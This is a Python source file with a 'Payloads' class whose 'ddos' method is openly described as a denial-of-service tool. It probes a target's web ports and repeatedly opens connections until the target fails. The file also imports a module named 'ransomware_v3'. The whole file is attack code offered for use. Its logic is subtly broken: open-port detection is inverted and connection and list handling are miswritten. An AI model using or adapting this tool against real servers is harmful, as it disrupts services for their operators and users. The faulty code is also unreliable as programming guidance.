import ransomware_v3 
import socket 
import requests 
import http.client 

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""


class Payloads:
    ammount = 0
    def __init__(self):
        if Payloads.ammount == 1:
            self.__del__()
        Payloads.ammount += 1

    def ddos(self, target: str) -> bool:
        def create_headers() -> dict:
            pass 

        create_headers()

        # Checks for open ports
        open_ports = []
        supported_ports = (80, 443)
        for port in supported_ports:
            port_checker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            is_port_open = port_checker.connect_ex((target, port))
            if is_port_open:
                open_ports.append(port)
        
        func = None
        for port in open_ports:
            match port:
                case 80:
                    func = http.client.HTTPConnection 

                case 443:
                    func = http.client.HTTPSConnection

        target_status = 200
        while target_status == 200:
			# Checks if target is up
            print('200 OK', end='\r', flush=True)
            request = requests.get(target)
            target_status = request.status_code

			# Sends request to target	
            valid_port: int = 0
            for port in open_ports:
                try:
                    connection = func((target, port))
                    connection.connect()
                    valid_port = port
                    break

                except:
                    open_ports.pop(port)

            if not valid_port:
                return False

        if target_status != 429:
            print('\n')
            print(f'Error, status code: {target_status}') 
            return target_status
		
        else:
            print('Target has been succesfully DDOS !')
            return target_status
